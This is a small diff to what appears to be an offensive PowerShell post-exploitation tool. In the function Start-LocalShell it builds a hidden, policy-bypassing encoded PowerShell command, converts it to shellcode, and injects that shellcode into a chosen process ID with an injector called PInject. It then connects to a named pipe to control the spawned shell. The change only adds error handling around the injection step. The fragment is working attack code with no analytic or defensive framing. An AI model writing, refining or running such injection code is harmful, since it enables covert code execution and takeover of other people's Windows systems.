@@ -2436,8 +2436,8 @@ function Start-LocalShell {
             $fin_mg = "powershell.exe -NoLogo -NonInteractive -ep bypass -Window Hidden -enc $b64_mg"
             $sc_mg  = (ShellGen -ShCommand $fin_mg).Trim()
             Write-Output " [*] Injecting shellcode into PID $targetPid via PInject..."
-            PInject /t:1 /f:hex /pid:$targetPid /sc:$sc_mg /enc:AES
-            Write-Output " [+] Injected. Connecting to pipe $PN (15s timeout)..."
+            try { PInject /t:1 /f:hex /pid:$targetPid /sc:$sc_mg /enc:AES } catch { Write-Output " [!] PInject: $($_.Exception.Message)" }
+            Write-Output " [+] Connecting to pipe $PN (15s timeout)..."
             Start-Sleep -Seconds 2
             try {
                 $mgClient = New-Object System.IO.Pipes.NamedPipeClientStream('.', $PN, [System.IO.Pipes.PipeDirection]::InOut)
